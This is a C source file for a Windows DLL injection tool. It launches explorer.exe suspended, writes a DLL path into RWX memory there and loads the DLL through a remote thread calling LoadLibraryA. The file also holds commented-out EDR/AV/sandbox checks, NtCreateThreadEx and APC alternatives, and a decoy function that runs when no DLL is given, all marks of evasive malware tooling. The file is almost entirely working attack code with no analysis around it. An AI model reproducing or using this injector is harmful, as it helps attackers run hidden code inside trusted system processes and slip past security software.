#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "detector.h"
#include "evasion.h"

// Core Injection Logic
void StealthExec(HANDLE hProc, const char *dllN)
{
    PVOID memLoc = NULL;
    SIZE_T sz = strlen(dllN) + 1;
    HANDLE hThreadRemote;
    NTSTATUS status;

    // Resolve Required Functions
    pMod pLLoad = GetMod("kernel32.dll", "LoadLibraryA");

    if (!pLLoad)
    {
        printf("[!] Failed to resolve LoadLibraryA.\n");
        return;
    }
    else
    {
        printf("[*] Successfully resolve LoadLibraryA.\n");
    }

    memLoc = VirtualAllocEx(hProc, 0, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    /*
    status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0)
    {
        printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
        return;
    }
    */
    

    if (memLoc == NULL)
    {
        printf("[!] Memory allocation failed, BaseAddress is NULL.\n");
        return;
    }
    else
    {
        printf("[*] Successfully allocate memory.\n");
    }

    // Write DLL Path to Remote Process
    //status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
    status = WriteProcessMemory(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
    if (status != 1)
    {
        printf("[!] Memory write failed (Err: 0x%lX).\n", status);
        return;
    }
    else
    {
        printf("[*] Successfully write memory.\n");
    }
    
    // Load Remote DLL
    hThreadRemote = CreateRemoteThreadEx(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL, NULL);
    if (!hThreadRemote)
    {
        printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
        return;
    }

    DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000);  // Wait for 5 seconds
    if (waitResult == WAIT_TIMEOUT) {
        printf("[!] Remote thread timed out!\n");
        TerminateThread(hThreadRemote, 0);  // Kill stuck thread
        return;
    } else if (waitResult == WAIT_FAILED) {
        printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
        CloseHandle(hThreadRemote);
        return;
    }
    ResumeThread(hThreadRemote);
    CloseHandle(hThreadRemote);
    
    /*
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

    hThreadRemote = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, FALSE, 0, 0, 0, NULL);

    printf("[*] NtCreateThreadEx status: 0x%lx\n", status);
    DWORD waitResult = WaitForSingleObject(hThread, 5000);  // Wait for 5 seconds
    if (waitResult == WAIT_TIMEOUT) {
        printf("[!] Remote thread timed out!\n");
        TerminateThread(hThread, 0);  // Kill stuck thread
        return;
    } else if (waitResult == WAIT_FAILED) {
        printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
        CloseHandle(hThread);
        return;
    }
    ResumeThread(hThread);
    CloseHandle(hThread);
    */

    /*
    QueueUserAPC((PAPCFUNC)pLLoad, hThread, (ULONG_PTR)memLoc);
    ResumeThread(hThread);
    CloseHandle(hThread); 
    */

    printf("[*] Successfully injected module\n");
}

// Entry Function
int main(int argc, char *argv[])
{
    // Check For EDR/AV/Sandbox env
    // if (PerfomChecksEnv())
    // {
    //     return 0;
    // }

    // If no DLL given, abort.
    if (argc != 2)
    {
        SortNumbers();
        return 0;
    }

    const char *dllPath = argv[1];

    STARTUPINFOA sInfo = {0};
    PROCESS_INFORMATION pInfo = {0};

    // const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
    // const char *procName = "SearchProtocolHost.exe";
    // Also work with explorer.exe
    const char* procPath = "C:\\Windows\\explorer.exe";
    const char *procName = "Explorer.exe";

    if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
    {
        printf("[!] Could not create %s. Err: %lu\n", procName, GetLastError());
        return -1;
    }
    
    printf("[*] Suspended %s created.\n", procName);

    // Perform Injection
    StealthExec(pInfo.hProcess, dllPath);

    // Resume Execution
    CloseHandle(pInfo.hProcess);
    printf("[*] %s is now running.\n", procName);

    return 0;
}